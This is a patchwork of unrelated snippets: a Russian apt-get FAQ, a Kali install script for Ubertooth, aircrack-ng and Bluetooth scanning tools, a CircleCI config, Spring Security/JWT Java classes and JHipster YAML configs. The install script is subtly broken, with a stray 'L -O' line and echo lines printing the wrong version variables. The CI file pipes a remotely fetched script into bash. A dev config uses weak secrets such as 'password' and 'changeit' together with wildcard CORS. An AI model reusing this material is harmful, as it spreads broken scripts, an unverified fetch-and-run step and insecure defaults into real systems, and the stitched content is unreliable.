Использование флага –no-upgrade предотвратит обновление уже установленных пакетов.
1
	
sudo apt-get install packageName --no-upgrade

Как только обновить определенные пакеты?

Флаг –only-upgrade не установит новые пакеты, а только обновит существующие.
1
	
sudo apt-get install имя_пакета --only-upgrade

Как я могу установить определенную версию пакета?

Представим, что вам необходимо установить специфичную версию пакета, просто используйте знак равно вместе с именем пакета и припишите желаемую версию.
1
	
sudo apt-get install vsftpd=2.3.5-3ubuntu1

Как удалить пакеты без удаления настроек?

Чтобы удалить программные пакеты без удаления их конфигурационных файлов (для дальнейшего их использования), используйте команду remove как показано.
1
	
sudo apt-get remove vsftpd

Как полностью удалить пакеты?

Чтобы удалить пакет вместе с его файлами настроек, используете подкоманду purge, как показано ниже.
1
	
sudo apt-get purge vsftpd

Или вы можете объединить обе команды, вот так:
1
	
sudo apt-get remove --purge vsftpd

Как можно очистить место на диске?

Команда clean используется для освобождения дискового пространствва за счет удаления полученных .deb-файлов пакетов в вашем локальном репозитории.
1
	
sudo apt-get clean

Как только загрузить исходный код пакета?

Чтобы только загрузить исходный код пакета, вы можете использовать опцию –download-only source с именем пакета, например:
1
	
sudo apt-get --download-only source vsftpd

Как можно загрузить и распаковать пакет?

Чтобы загрузить и распаковать исходный код пакета в специальную директорию, выполните следующую команду:
1
	
sudo apt-get source vsftpd

Как можно загрузить, распаковать и скомпилировать исходный код пакета?

Вы также можете загрузить, распаковать и скомпилировать исходный код пакета, используя опцию ‘–compile‘, как показано ниже:
1
	
sudo apt-get --compile source goaccess

Как загрузить пакет без установки

Используя опцию «download», вы можете загрузить любой пакет, не устанавливая его. Например, следующая команда только загрузит пакет nethogs в текущую рабочую директорию.
1
	
sudo apt-get download nethogs

Как можно просмотреть лог изменений (changelog) пакета?

Флаг changelog загружает лог изменений пакета и отображает версию пакета, если он установлен.
1
	
sudo apt-get changelog vsftpd

Как можно исправить сломанные зависимости?

Команда «check» — инструмент для диагностики, он используется для обновления кеша пакетов и проверки на сломанные зависимости.
1
	
sudo apt-get check

Как можно найти и собрать зависимости?

Команда build-dep ищет и устанавливает собранные зависимости нужного пакета. Если пакет отсутствует в локальном репозитории, вы получите ошибку.
1
	
sudo apt-get build-dep netcat

Как можно автоматически очистить кеш Apt-Get?

Команда autoclean удаляет все .deb-файлы из /var/cache/apt/archives для освобождения свободного места на жестком диске.
1
	
sudo apt-get autoclean

Как можно автоматически удалить ненужные пакеты?

Подкоманда autoremove используется для автоматического удаления пакетов, которые были установлены как зависимости других, но сейчас они больше не нужны. Например, следующая команда удалит установленный пакет вместе с его зависимостями.
1
	
sudo apt-get autoremove vsftpd
--------------------------------------------------------------------------------------------------------
#!/bin/bash

#
# Ubertooth install script for Kali Linux 2.0.0
#
# by Raul Siles
# Copyright (c) 2015 DinoSec SL (www.dinosec.com)
#
# Version: 2017-03-R2
# Date: 2015-10-31
#
# Ubertooth and libbtbb versions: 2017-03-R2
# Kali Linux version: 2.0.0
# Wireshark version: 1.12.6
# FING version: 2013-03-R1b
#

# Versions
FING_VERSION=2016-07-R1
AIRCRACK_VERSION=1.2
HORST_VERSION=5.1

AIRCRACK_URL=https://download.aircrack-ng.org/aircrack-ng-1.2.tar.gz
AIRCRACK_FILENAME=aircrack-ng-$AIRCRACK_VERSION.tar.gz
AIRCRACK_DIR=aircrack-ng-$AIRCRACK_VERSION
LIBBTBB_BACK=../..

HORST_URL=https://github.com/br101/horst/archive/v$HORST_VERSION.tar.gz
HORST_FILENAME=$HORST_VERSION.tar.gz
HORST_DIR=horst
HORST_BACK=..

FING_URL=https://39qiv73eht2y1az3q51pykkf-wpengine.netdna-ssl.com/wp-content/uploads/2018/02/FingKit_CLI_Linux_Debian.zip
FING_FILENAME=FingKit_CLI_Linux_Debian.zip
FING_DIR=Linux_Debian
FING_PACKAGE=fing-5.1.0-armhf.deb
FING_CONF_FILE=/etc/fing.conf
FING_BACK=..

BLUEHYDRA_URL=https://github.com/pwnieexpress/blue_hydra.git
BLUEHYDRA_DIR=blue_hydra
#BLUEHYDRA_CONF_FILE=/etc/BLUEHYDRA.conf
BLUEHYDRA_BACK=..

echo
echo "   Tools Versions:"
echo "   - Aircrack: $AIRCRACK_VERSION"
echo "   - Fing: $AIRCRACK_VERSION"
echo "   - Horst: $FING_VERSION"
echo "   - Blue HydRA: $FING_VERSION"
echo

echo "  Press any key to continue (or Ctrl+C):"
read key


echo "Fixing ssh keys"
#dpkg-reocnfigure -i openssh-server

echo "[*] Installing basic packages..."
echo
sudo apt-get install -y nano fish vim tshark tree sqlite3 tcpdump libtool screen tmux rfkill ethtool automake libssl-dev libnl-3-dev libnl-genl-3-dev pkg-config build-essential libpcre3-dev ruby-dev bluez bluez-test-scripts python-bluez python-dbus libsqlite3-dev bundler 

echo
echo "[*] Building aircrack ..."
wget $AIRCRACK_URL
L -O $AIRCRACK_FILENAME
tar xf $AIRCRACK_FILENAME
cd $AIRCRACK_DIR
autoreconf -i
./configure --with-experimental --with-ext-scripts
make
sudo make install
cd $LIBBTBB_BACK

echo "[*] Installing  Blue Hydra ..."
git clone  $BLUEHYDRA_URL 
cd $BLUEHYDRA_DIR
bundle install
cd $BLUEHYDRA_BACK


echo
echo "[*] Installing Horst.."
echo
wget $HORST_URL -O $HORST_FILENAME
tar xf $HORST_FILENAME
cd $HORST_DIR
make
sudo make install
cd $HORST_BACK

echo
echo "[*] Installing FING.."
echo
wget $FING_URL
unzip $FING_FILENAME
cd $FING_DIR
sudo dpkg -i $FING_PACKAGE
cd $FING_BACK

echo
echo "[*] End of the Pi tools install script. Congratulations!"
echo
--------------------------------------------------------------------------------------------------------
general:
    artifacts:
        - "build/reports/jacoco"        
machine:
    java:
        version: oraclejdk8
    environment:
        ANDROID_HOME: /usr/local/android-sdk-linux
        GRADLE_OPTS: '-Dorg.gradle.jvmargs="-Xmx2048m -XX:+HeapDumpOnOutOfMemoryError -Dfile.encoding=UTF-8"'
dependencies:
    pre:
        - echo y | android update sdk --no-ui --all --filter tools
        - echo y | android update sdk --no-ui --all --filter platform-tools
        - echo y | android update sdk --no-ui --all --filter build-tools-25.0.3
        - echo y | android update sdk --no-ui --all --filter android-25
        - echo y | android update sdk --no-ui --all --filter extra-google-m2repository
        - echo y | android update sdk --no-ui --all --filter extra-android-m2repository
        - chmod +x gradlew
        - ANDROID_HOME=/usr/local/android-sdk-linux ./gradlew dependencies
    cache_directories:
        - /usr/local/android-sdk-linux/tools
        - /usr/local/android-sdk-linux/build-tools/23.0.3
test:
    override:
        - ./gradlew lint
        - ./gradlew testDebugUnitTest
        - ./gradlew jacocoTestDebugUnitTestReport
    post:
        - bash <(curl -s https://codecov.io/bash)

--------------------------------------------------------------------------------------------------------
import android.util.Log;

class LogEngine {
    private final String tag;

    public LogEngine(final String tag) {
        this.tag = tag;
    }

    public void log(final String message) {
        Log.i(tag, message);
    }

    public void logError(final String message) {
        Log.e(tag, message);
    }

    public void logSecurity(final String message) {
        Log.w(tag, message);
    }

    public void logKeyEvent(final String message) {
        Log.e(tag, message);
    }
}
--------------------------------------------------------------------------------------------------------
import android.bluetooth.BluetoothClass;

public class BluetoothClassResolver {

    public static String resolveDeviceClass(final int btClass) {
        switch (btClass) {
            case BluetoothClass.Device.AUDIO_VIDEO_CAMCORDER:
                return "A/V, Camcorder";
            case BluetoothClass.Device.AUDIO_VIDEO_CAR_AUDIO:
                return "A/V, Car Audio";
            case BluetoothClass.Device.AUDIO_VIDEO_HANDSFREE:
                return "A/V, Handsfree";
            case BluetoothClass.Device.AUDIO_VIDEO_HEADPHONES:
                return "A/V, Headphones";
            case BluetoothClass.Device.AUDIO_VIDEO_HIFI_AUDIO:
                return "A/V, HiFi Audio";
            case BluetoothClass.Device.AUDIO_VIDEO_LOUDSPEAKER:
                return "A/V, Loudspeaker";
            case BluetoothClass.Device.AUDIO_VIDEO_MICROPHONE:
                return "A/V, Microphone";
            case BluetoothClass.Device.AUDIO_VIDEO_PORTABLE_AUDIO:
                return "A/V, Portable Audio";
            case BluetoothClass.Device.AUDIO_VIDEO_SET_TOP_BOX:
                return "A/V, Set Top Box";
            case BluetoothClass.Device.AUDIO_VIDEO_UNCATEGORIZED:
                return "A/V, Uncategorized";
            case BluetoothClass.Device.AUDIO_VIDEO_VCR:
                return "A/V, VCR";
            case BluetoothClass.Device.AUDIO_VIDEO_VIDEO_CAMERA:
                return "A/V, Video Camera";
            case BluetoothClass.Device.AUDIO_VIDEO_VIDEO_CONFERENCING:
                return "A/V, Video Conferencing";
            case BluetoothClass.Device.AUDIO_VIDEO_VIDEO_DISPLAY_AND_LOUDSPEAKER:
                return "A/V, Video Display and Loudspeaker";
            case BluetoothClass.Device.AUDIO_VIDEO_VIDEO_GAMING_TOY:
                return "A/V, Video Gaming Toy";
            case BluetoothClass.Device.AUDIO_VIDEO_VIDEO_MONITOR:
                return "A/V, Video Monitor";
            case BluetoothClass.Device.AUDIO_VIDEO_WEARABLE_HEADSET:
                return "A/V, Video Wearable Headset";
            case BluetoothClass.Device.COMPUTER_DESKTOP:
                return "Computer, Desktop";
            case BluetoothClass.Device.COMPUTER_HANDHELD_PC_PDA:
                return "Computer, Handheld PC/PDA";
            case BluetoothClass.Device.COMPUTER_LAPTOP:
                return "Computer, Laptop";
            case BluetoothClass.Device.COMPUTER_PALM_SIZE_PC_PDA:
                return "Computer, Palm Size PC/PDA";
            case BluetoothClass.Device.COMPUTER_SERVER:
                return "Computer, Server";
            case BluetoothClass.Device.COMPUTER_UNCATEGORIZED:
                return "Computer, Uncategorized";
            case BluetoothClass.Device.COMPUTER_WEARABLE:
                return "Computer, Wearable";
            case BluetoothClass.Device.HEALTH_BLOOD_PRESSURE:
                return "Health, Blood Pressure";
            case BluetoothClass.Device.HEALTH_DATA_DISPLAY:
                return "Health, Data Display";
            case BluetoothClass.Device.HEALTH_GLUCOSE:
                return "Health, Glucose";
            case BluetoothClass.Device.HEALTH_PULSE_OXIMETER:
                return "Health, Pulse Oximeter";
            case BluetoothClass.Device.HEALTH_PULSE_RATE:
                return "Health, Pulse Rate";
            case BluetoothClass.Device.HEALTH_THERMOMETER:
                return "Health, Thermometer";
            case BluetoothClass.Device.HEALTH_UNCATEGORIZED:
                return "Health, Uncategorized";
            case BluetoothClass.Device.HEALTH_WEIGHING:
                return "Health, Weighting";
            case BluetoothClass.Device.PHONE_CELLULAR:
                return "Phone, Cellular";
            case BluetoothClass.Device.PHONE_CORDLESS:
                return "Phone, Cordless";
            case BluetoothClass.Device.PHONE_ISDN:
                return "Phone, ISDN";
            case BluetoothClass.Device.PHONE_MODEM_OR_GATEWAY:
                return "Phone, Modem or Gateway";
            case BluetoothClass.Device.PHONE_SMART:
                return "Phone, Smart";
            case BluetoothClass.Device.PHONE_UNCATEGORIZED:
                return "Phone, Uncategorized";
            case BluetoothClass.Device.TOY_CONTROLLER:
                return "Toy, Controller";
            case BluetoothClass.Device.TOY_DOLL_ACTION_FIGURE:
                return "Toy, Doll/Action Figure";
            case BluetoothClass.Device.TOY_GAME:
                return "Toy, Game";
            case BluetoothClass.Device.TOY_ROBOT:
                return "Toy, Robot";
            case BluetoothClass.Device.TOY_UNCATEGORIZED:
                return "Toy, Uncategorized";
            case BluetoothClass.Device.TOY_VEHICLE:
                return "Toy, Vehicle";
            case BluetoothClass.Device.WEARABLE_GLASSES:
                return "Wearable, Glasses";
            case BluetoothClass.Device.WEARABLE_HELMET:
                return "Wearable, Helmet";
            case BluetoothClass.Device.WEARABLE_JACKET:
                return "Wearable, Jacket";
            case BluetoothClass.Device.WEARABLE_PAGER:
                return "Wearable, Pager";
            case BluetoothClass.Device.WEARABLE_UNCATEGORIZED:
                return "Wearable, Uncategorized";
            case BluetoothClass.Device.WEARABLE_WRIST_WATCH:
                return "Wearable, Wrist Watch";
            default:
                return "Unknown, Unknown (class=" + btClass + ")";
        }
    }

    public static String resolveMajorDeviceClass(final int majorBtClass) {
        switch (majorBtClass) {
            case BluetoothClass.Device.Major.AUDIO_VIDEO:
                return "Audio/ Video";
            case BluetoothClass.Device.Major.COMPUTER:
                return "Computer";
            case BluetoothClass.Device.Major.HEALTH:
                return "Health";
            case BluetoothClass.Device.Major.IMAGING:
                return "Imaging";
            case BluetoothClass.Device.Major.MISC:
                return "Misc";
            case BluetoothClass.Device.Major.NETWORKING:
                return "Networking";
            case BluetoothClass.Device.Major.PERIPHERAL:
                return "Peripheral";
            case BluetoothClass.Device.Major.PHONE:
                return "Phone";
            case BluetoothClass.Device.Major.TOY:
                return "Toy";
            case BluetoothClass.Device.Major.UNCATEGORIZED:
                return "Uncategorized";
            case BluetoothClass.Device.Major.WEARABLE:
                return "Wearable";
            default:
                return "Unknown (" +majorBtClass+ ")";
        }
    }
}
--------------------------------------------------------------------------------------------------------
cat /etc/httpd/conf/httpd.conf | grep shirts | grep -v "#"
--------------------------------------------------------------------------------------------------------

    @ExceptionHandler({AccessDeniedException.class})
    @ResponseBody
    @ResponseStatus(HttpStatus.FORBIDDEN)
    protected ResponseEntity<?> handle(final HttpServletRequest req, final AccessDeniedException ex) {
        LOGGER.error(ex.getMessage());
        String url = req.getRequestURI().substring(req.getContextPath().length());
        return new ResponseEntity<>(new ExceptionEntity(url, ResponseStatusCode.FORBIDDEN, ex.getMessage()), HttpStatus.FORBIDDEN);
    }
--------------------------------------------------------------------------------------------------------
@GET
@Consumes({ MediaType.APPLICATION_XML, MediaType.APPLICATION_JSON, MediaType.APPLICATION_FORM_URLENCODED })
@Produces({ MediaType.APPLICATION_XML, MediaType.APPLICATION_JSON, MediaType.APPLICATION_FORM_URLENCODED })
@ApiOperation(value = "Get all ServiceConfigs", response = ServiceConfigResultsModel.class)
@ApiResponses(value = {
		@ApiResponse(code = HttpURLConnection.HTTP_OK, message = "Returns a list of ServiceConfig", response = ServiceConfigResultsModel.class),
		@ApiResponse(code = HttpURLConnection.HTTP_UNAUTHORIZED, message = "Unauthorized", response = ExceptionModel.class),
		@ApiResponse(code = HttpURLConnection.HTTP_NOT_FOUND, message = "Not found", response = ExceptionModel.class),
		@ApiResponse(code = HttpURLConnection.HTTP_FORBIDDEN, message = "Access denied", response = ExceptionModel.class) })
public Response getServiceConfigs(@Context HttpServletRequest request, @Context HttpHeaders header,
		@Context Company company, @Context Locale locale, @Context User user,
		@Context ServiceContext serviceContext,
		@ApiParam(value = "query params for search") @BeanParam ServiceConfigSearchModel search);
--------------------------------------------------------------------------------------------------------

import com.springio.store.domain.User;
import com.springio.store.repository.UserRepository;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.security.core.GrantedAuthority;
import org.springframework.security.core.authority.SimpleGrantedAuthority;
import org.springframework.security.core.userdetails.UserDetails;
import org.springframework.security.core.userdetails.UserDetailsService;
import org.springframework.security.core.userdetails.UsernameNotFoundException;
import org.springframework.stereotype.Component;
import org.springframework.transaction.annotation.Transactional;

import java.util.*;
import java.util.stream.Collectors;

/**
 * Authenticate a user from the database.
 */
@Component("userDetailsService")
public class DomainUserDetailsService implements UserDetailsService {

    private final Logger log = LoggerFactory.getLogger(DomainUserDetailsService.class);

    private final UserRepository userRepository;

    public DomainUserDetailsService(UserRepository userRepository) {
        this.userRepository = userRepository;
    }

    @Override
    @Transactional
    public UserDetails loadUserByUsername(final String login) {
        log.debug("Authenticating {}", login);
        String lowercaseLogin = login.toLowerCase(Locale.ENGLISH);
        Optional<User> userFromDatabase = userRepository.findOneWithAuthoritiesByLogin(lowercaseLogin);
        return userFromDatabase.map(user -> {
            if (!user.getActivated()) {
                throw new UserNotActivatedException("User " + lowercaseLogin + " was not activated");
            }
            List<GrantedAuthority> grantedAuthorities = user.getAuthorities().stream()
                    .map(authority -> new SimpleGrantedAuthority(authority.getName()))
                .collect(Collectors.toList());
            return new org.springframework.security.core.userdetails.User(lowercaseLogin,
                user.getPassword(),
                grantedAuthorities);
        }).orElseThrow(() -> new UsernameNotFoundException("User " + lowercaseLogin + " was not found in the " +
        "database"));
    }
}
--------------------------------------------------------------------------------------------------------
import org.springframework.security.config.annotation.SecurityConfigurerAdapter;
import org.springframework.security.config.annotation.web.builders.HttpSecurity;
import org.springframework.security.web.DefaultSecurityFilterChain;
import org.springframework.security.web.authentication.UsernamePasswordAuthenticationFilter;

public class JWTConfigurer extends SecurityConfigurerAdapter<DefaultSecurityFilterChain, HttpSecurity> {

    public static final String AUTHORIZATION_HEADER = "Authorization";

    public static final String AUTHORIZATION_TOKEN = "access_token";

    private TokenProvider tokenProvider;

    public JWTConfigurer(TokenProvider tokenProvider) {
        this.tokenProvider = tokenProvider;
    }

    @Override
    public void configure(HttpSecurity http) throws Exception {
        JWTFilter customFilter = new JWTFilter(tokenProvider);
        http.addFilterBefore(customFilter, UsernamePasswordAuthenticationFilter.class);
    }
}
--------------------------------------------------------------------------------------------------------

import org.springframework.security.core.Authentication;
import org.springframework.security.core.context.SecurityContextHolder;
import org.springframework.util.StringUtils;
import org.springframework.web.filter.GenericFilterBean;

import javax.servlet.FilterChain;
import javax.servlet.ServletException;
import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;
import javax.servlet.http.HttpServletRequest;
import java.io.IOException;

/**
 * Filters incoming requests and installs a Spring Security principal if a header corresponding to a valid user is
 * found.
 */
public class JWTFilter extends GenericFilterBean {

    private TokenProvider tokenProvider;

    public JWTFilter(TokenProvider tokenProvider) {
        this.tokenProvider = tokenProvider;
    }

    @Override
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)
        throws IOException, ServletException {
        HttpServletRequest httpServletRequest = (HttpServletRequest) servletRequest;
        String jwt = resolveToken(httpServletRequest);
        if (StringUtils.hasText(jwt) && this.tokenProvider.validateToken(jwt)) {
            Authentication authentication = this.tokenProvider.getAuthentication(jwt);
            SecurityContextHolder.getContext().setAuthentication(authentication);
        }
        filterChain.doFilter(servletRequest, servletResponse);
    }

    private String resolveToken(HttpServletRequest request){
        String bearerToken = request.getHeader(JWTConfigurer.AUTHORIZATION_HEADER);
        if (StringUtils.hasText(bearerToken) && bearerToken.startsWith("Bearer ")) {
            return bearerToken.substring(7, bearerToken.length());
        }
        String jwt = request.getParameter(JWTConfigurer.AUTHORIZATION_TOKEN);
        if (StringUtils.hasText(jwt)) {
            return jwt;
        }
        return null;
    }
}
--------------------------------------------------------------------------------------------------------
package com.springio.store.config.audit;

import com.springio.store.domain.PersistentAuditEvent;

import org.springframework.boot.actuate.audit.AuditEvent;
import org.springframework.security.web.authentication.WebAuthenticationDetails;
import org.springframework.stereotype.Component;

import java.util.*;

@Component
public class AuditEventConverter {

    /**
     * Convert a list of PersistentAuditEvent to a list of AuditEvent
     *
     * @param persistentAuditEvents the list to convert
     * @return the converted list.
     */
    public List<AuditEvent> convertToAuditEvent(Iterable<PersistentAuditEvent> persistentAuditEvents) {
        if (persistentAuditEvents == null) {
            return Collections.emptyList();
        }
        List<AuditEvent> auditEvents = new ArrayList<>();
        for (PersistentAuditEvent persistentAuditEvent : persistentAuditEvents) {
            auditEvents.add(convertToAuditEvent(persistentAuditEvent));
        }
        return auditEvents;
    }

    /**
     * Convert a PersistentAuditEvent to an AuditEvent
     *
     * @param persistentAuditEvent the event to convert
     * @return the converted list.
     */
    public AuditEvent convertToAuditEvent(PersistentAuditEvent persistentAuditEvent) {
        return new AuditEvent(Date.from(persistentAuditEvent.getAuditEventDate()), persistentAuditEvent.getPrincipal(),
            persistentAuditEvent.getAuditEventType(), convertDataToObjects(persistentAuditEvent.getData()));
    }

    /**
     * Internal conversion. This is needed to support the current SpringBoot actuator AuditEventRepository interface
     *
     * @param data the data to convert
     * @return a map of String, Object
     */
    public Map<String, Object> convertDataToObjects(Map<String, String> data) {
        Map<String, Object> results = new HashMap<>();

        if (data != null) {
            for (Map.Entry<String, String> entry : data.entrySet()) {
                results.put(entry.getKey(), entry.getValue());
            }
        }
        return results;
    }

    /**
     * Internal conversion. This method will allow to save additional data.
     * By default, it will save the object as string
     *
     * @param data the data to convert
     * @return a map of String, String
     */
    public Map<String, String> convertDataToStrings(Map<String, Object> data) {
        Map<String, String> results = new HashMap<>();

        if (data != null) {
            for (Map.Entry<String, Object> entry : data.entrySet()) {
                Object object = entry.getValue();

                // Extract the data that will be saved.
                if (object instanceof WebAuthenticationDetails) {
                    WebAuthenticationDetails authenticationDetails = (WebAuthenticationDetails) object;
                    results.put("remoteAddress", authenticationDetails.getRemoteAddress());
                    results.put("sessionId", authenticationDetails.getSessionId());
                } else if (object != null) {
                    results.put(entry.getKey(), object.toString());
                } else {
                    results.put(entry.getKey(), "null");
                }
            }
        }

        return results;
    }
}
--------------------------------------------------------------------------------------------------------
<bean id="sessionFactory" class="org.springframework.orm.hibernate4.LocalSessionFactoryBean" destroy-method="destroy">
    <property name="dataSource" ref="dataSource"/>
    <property name="configLocation" value="classpath:hibernate.cfg.xml"/>
    <property name="hibernateProperties">
        <props>
            <prop key="hibernate.dialect">${hibernate.dialect}</prop>
            <prop key="hibernate.query.substitutions">true 'Y', false 'N'</prop>
            <prop key="hibernate.cache.use_second_level_cache">true</prop>
            <prop key="hibernate.cache.provider_class">org.hibernate.cache.EhCacheProvider</prop>
            <!-- Hibernate Search index directory -->
            <prop key="hibernate.search.default.indexBase">${app.search.index.basedir}</prop>
        </props>
        <!-- Turn batching off for better error messages under PostgreSQL -->
        <!-- hibernate.jdbc.batch_size=0 -->
    </property>
</bean>
--------------------------------------------------------------------------------------------------------
# ===================================================================
# Spring Boot configuration for the "dev" profile.
#
# This configuration overrides the application.yml file.
#
# More information on profiles: https://www.jhipster.tech/profiles/
# More information on configuration properties: https://www.jhipster.tech/common-application-properties/
# ===================================================================

# ===================================================================
# Standard Spring Boot properties.
# Full reference is available at:
# http://docs.spring.io/spring-boot/docs/current/reference/html/common-application-properties.html
# ===================================================================

logging:
  level:
    ROOT: DEBUG
    io.github.jhipster: DEBUG
    com.kekse.mystaff: DEBUG

eureka:
  instance:
    prefer-ip-address: true
  client:
    service-url:
      defaultZone: http://admin:${jhipster.registry.password}@${DEV_REGISTRY_ADDRESS}:${DEV_REGISTRY_PORT}/eureka/

spring:
  elasticsearch:
    rest:
      uris: http://localhost:9200
  profiles:
    active: dev
    include:
      - swagger
      # Uncomment to activate TLS for the dev profile
      #- tls
  devtools:
    restart:
      enabled: true
    livereload:
      enabled: false # we use Webpack dev server + BrowserSync for livereload
  jackson:
    serialization:
      indent-output: true
  datasource:
    type: com.zaxxer.hikari.HikariDataSource
    url: jdbc:mysql://${DEV_DB_ADDRESS}:${DEV_DB_PORT}/UserAuthorityAgent600?createDatabaseIfNotExist=true&useUnicode=true&characterEncoding=utf8&useSSL=false&useLegacyDatetimeCode=false&serverTimezone=UTC
    username: ${DEV_DB_USERNAME}
    password: ${DEV_DB_PASSWORD}
    hikari:
      poolName: Hikari
      auto-commit: false
      data-source-properties:
        cachePrepStmts: true
        prepStmtCacheSize: 250
        prepStmtCacheSqlLimit: 2048
        useServerPrepStmts: true
  jpa:
    database-platform: org.hibernate.dialect.MySQL5InnoDBDialect
    database: MYSQL
    show-sql: true
    properties:
      hibernate.id.new_generator_mappings: true
      hibernate.connection.provider_disables_autocommit: true
      hibernate.cache.use_second_level_cache: true
      hibernate.cache.use_query_cache: false
      hibernate.generate_statistics: false
      hibernate.cache.region.factory_class: com.hazelcast.hibernate.HazelcastCacheRegionFactory
      hibernate.cache.hazelcast.instance_name: UserAuthorityAgent
      hibernate.cache.use_minimal_puts: true
      hibernate.cache.hazelcast.use_lite_member: true
  data:
    elasticsearch:
      properties:
        path:
          home: target/elasticsearch
  liquibase:
    # Remove 'faker' if you do not want the sample data to be loaded automatically
    contexts: dev, faker
  mail:
    host: ${DEV_MAIL_HOST}
    port: ${DEV_MAIL_PORT}
    username: ${DEV_MAIL_USERNAME}
    password: ${DEV_MAIL_PASSWORD}
    protocol: ${DEV_MAIL_PROTOCOL}
    tls: true
    properties.mail.smtp:
      auth: true
      starttls.enable: true
      ssl.trust: ${DEV_MAIL_SSL_TRUST}
  messages:
    cache-duration: PT1S # 1 second, see the ISO 8601 standard
  thymeleaf:
    cache: false
  sleuth:
    sampler:
      probability: 1 # report 100% of traces
  zipkin: # Use the "zipkin" Maven profile to have the Spring Cloud Zipkin dependencies
    base-url: http://localhost:9411
    enabled: false
    locator:
      discovery:
        enabled: true

server:
  port: 9999

# ===================================================================
# JHipster specific properties
#
# Full reference is available at: https://www.jhipster.tech/common-application-properties/
# ===================================================================

jhipster:
  cache: # Cache configuration
    hazelcast: # Hazelcast distributed cache
      time-to-live-seconds: 3600
      backup-count: 1
      management-center: # Full reference is available at: http://docs.hazelcast.org/docs/management-center/3.9/manual/html/Deploying_and_Starting.html
        enabled: false
        update-interval: 3
        url: http://localhost:8180/mancenter
  # CORS is only enabled by default with the "dev" profile, so BrowserSync can access the API
  cors:
    allowed-origins: '*'
    allowed-methods: '*'
    allowed-headers: '*'
    exposed-headers: 'Authorization,Link,X-Total-Count'
    allow-credentials: true
    max-age: 1800
  security:
    client-authorization:
      client-id: internal
      client-secret: internal
  mail: # specific JHipster mail property, for standard properties see MailProperties
    from: UserAuthorityAgent@localhost
    base-url: http://127.0.0.1:8080
  metrics:
    logs: # Reports metrics in the logs
      enabled: false
      report-frequency: 60 # in seconds
  logging:
    use-json-format: false # By default, logs are not in Json format
    logstash: # Forward logs to logstash over a socket, used by LoggingConfiguration
      enabled: false
      host: localhost
      port: 5000
      queue-size: 512
uaa:
  key-store:
    name: config/tls/keystore.p12
    password: password
    alias: selfsigned
  web-client-configuration:
    # Access Token is valid for 5 mins
    access-token-validity-in-seconds: 300
    # Refresh Token is valid for 7 days
    refresh-token-validity-in-seconds-for-remember-me: 604800
    client-id: web_app
    secret: changeit
# ===================================================================
# Application specific properties
# Add your own application properties here, see the ApplicationProperties class
# to have type-safe configuration, like in the JHipsterProperties above
#
# More documentation is available at:
# https://www.jhipster.tech/common-application-properties/
# ===================================================================

# application:

-------------------------------------------------------------------------------------------------------
static Consumer<Integer> lambdaWrapper(Consumer<Integer> consumer) {
    return i -> {
        try {
            consumer.accept(i);
        } catch (ArithmeticException e) {
            System.err.println(
              "Arithmetic Exception occured : " + e.getMessage());
        }
    };
}

List<Integer> integers = Arrays.asList(3, 9, 7, 0, 10, 20);
integers.forEach(lambdaWrapper(i -> System.out.println(50 / i)));

static <T, E extends Exception> Consumer<T>
  consumerWrapper(Consumer<T> consumer, Class<E> clazz) {
  
    return i -> {
        try {
            consumer.accept(i);
        } catch (Exception ex) {
            try {
                E exCast = clazz.cast(ex);
                System.err.println(
                  "Exception occured : " + exCast.getMessage());
            } catch (ClassCastException ccEx) {
                throw ex;
            }
        }
    };
}

List<Integer> integers = Arrays.asList(3, 9, 7, 0, 10, 20);
integers.forEach(
  consumerWrapper(
    i -> System.out.println(50 / i), 
    ArithmeticException.class));
	
	
List<Integer> integers = Arrays.asList(3, 9, 7, 0, 10, 20);
integers.forEach(i -> {
    try {
        writeToFile(i);
    } catch (IOException e) {
        throw new RuntimeException(e);
    }
});


@FunctionalInterface
public interface ThrowingConsumer<T, E extends Exception> {
    void accept(T t) throws E;
}

static <T> Consumer<T> throwingConsumerWrapper(
  ThrowingConsumer<T, Exception> throwingConsumer) {
  
    return i -> {
        try {
            throwingConsumer.accept(i);
        } catch (Exception ex) {
            throw new RuntimeException(ex);
        }
    };
}

List<Integer> integers = Arrays.asList(3, 9, 7, 0, 10, 20);
integers.forEach(throwingConsumerWrapper(i -> writeToFile(i)));
-------------------------------------------------------------------------------------------------------
import java.util.concurrent.Callable;

import static org.assertj.core.error.ShouldBeInstance.shouldBeInstance;

/**
 * Assertion methods for {@link Throwable}s.
 * <p>
 * To create a new instance of this class, invoke <code>{@link Assertions#assertThat(Throwable)}</code>.
 * </p>
 *
 * @author David DIDIER
 * @author Alex Ruiz
 * @author Joel Costigliola
 * @author Mikhail Mazursky
 */
public class ThrowableAssert extends AbstractThrowableAssert<ThrowableAssert, Throwable> {

  public interface ThrowingCallable {
    void call() throws Throwable;
  }

  public ThrowableAssert(Throwable actual) {
    super(actual, ThrowableAssert.class);
  }

  public <V> ThrowableAssert(Callable<V> runnable) {
    super(buildThrowableAssertFromCallable(runnable), ThrowableAssert.class);
  }

  private static <V> Throwable buildThrowableAssertFromCallable(Callable<V> callable) throws AssertionError {
    try {
      callable.call();
      // fail if the expected exception was *not* thrown
      Fail.fail("Expecting code to throw an exception.");
      // this will *never* happen...
      return null;
    } catch (AssertionError e) {
      // do not handle AssertionErrors in the next catch block!
      throw e;
    } catch (Throwable throwable) {
      // the throwable we will check
      return throwable;
    }
  }

  public static Throwable catchThrowable(ThrowingCallable shouldRaiseThrowable) {
    try {
      shouldRaiseThrowable.call();
    } catch (Throwable throwable) {
      return throwable;
    }
    return null;
  }

  @SuppressWarnings("unchecked")
  public static <THROWABLE extends Throwable> THROWABLE catchThrowableOfType(ThrowingCallable shouldRaiseThrowable,
                                                                             Class<THROWABLE> type) {
    Throwable throwable = catchThrowable(shouldRaiseThrowable);
    if (throwable == null) return null;
    // check exception type
    new ThrowableAssert(throwable).overridingErrorMessage(shouldBeInstance(throwable, type).create())
                                  .isInstanceOf(type);
    return (THROWABLE) throwable;
  }
}
-------------------------------------------------------------------------------------------------------
    AsyncContext asyncContext = request.startAsync();
    asyncContext.setTimeout(30000);
    asyncContext.start(myRunnableClass);
-------------------------------------------------------------------------------------------------------
# Paragon MicroServices Distributor configuration
---
server:
  port: 8089
  tomcat:
    remote-ip-header: x-forward-for

redis:
  user:
    field-key: data
    key-space: user
    time-to-live: 300

spring:
  redis:
    host: localhost
    port: 6379
  mvc:
    throw-exception-if-no-handler-found: true
    log-resolved-exception: true
  devtools:
    add-properties: false
  aop:
    proxy-target-class: true
  datasource:
